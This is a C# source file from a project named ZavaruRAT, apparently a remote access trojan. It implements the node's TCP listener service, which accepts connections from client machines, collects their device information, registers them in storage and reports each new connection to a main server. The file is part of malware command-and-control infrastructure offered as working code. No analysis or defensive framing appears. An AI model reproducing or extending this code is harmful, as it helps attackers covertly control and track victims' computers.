#region

using System.Net;
using System.Net.Sockets;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;
using ZavaruRAT.Shared;
using ZavaruRAT.Shared.Models.Client;

#endregion

namespace ZavaruRAT.Node.Services;

public sealed class ZavaruListenerService : BackgroundService
{
    private readonly MainServerClient _server;
    private readonly ZavaruClientsStorage _storage;
    private readonly IConfiguration _configuration;
    private readonly ILogger<ZavaruListenerService> _logger;

    private TcpListener _tcpListener = null!;

    public ZavaruListenerService(MainServerClient server, ZavaruClientsStorage storage, IConfiguration configuration,
                                 ILogger<ZavaruListenerService> logger)
    {
        _server = server;
        _storage = storage;
        _configuration = configuration;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _tcpListener = new TcpListener(IPAddress.Parse(_configuration["Listener:IP"]!),
                                       int.Parse(_configuration["Listener:Port"]!));
        _tcpListener.Start(120);

        _logger.LogInformation("Listener started");

        await ListenClientsAsync(stoppingToken);
    }

    private async Task ListenClientsAsync(CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                var client = await AcceptClientAsync(cancellationToken);

                // todo: do not block current loop
                var deviceInfo = await client.ReceiveAsync<DeviceInfo>(4000, cancellationToken);
                if (deviceInfo == null)
                {
                    client.Dispose();
                    continue;
                }

                var storedClient = _storage.AddClient(client, deviceInfo);

                await _server.SendClientConnected(new ClientConnectedEvent
                {
                    Id = storedClient.Id.ToString(),
                    DeviceInfo = deviceInfo!.ToProto()
                }, cancellationToken);
            }
            catch (TaskCanceledException)
            {
                break;
            }
            catch (Exception e)
            {
                _logger.LogError(e, "Error while accepting incoming connection");
            }
        }
    }

    private async Task<ZavaruClient> AcceptClientAsync(CancellationToken cancellationToken)
    {
        var client = await _tcpListener.AcceptTcpClientAsync(cancellationToken);
        var zavaruClient = ZavaruClient.FromTcpClient(client);

        if (!zavaruClient.Connected)
        {
            throw new Exception("Client is not connected");
        }

        _logger.LogInformation("{Client} connected", zavaruClient);

        return zavaruClient;
    }
}
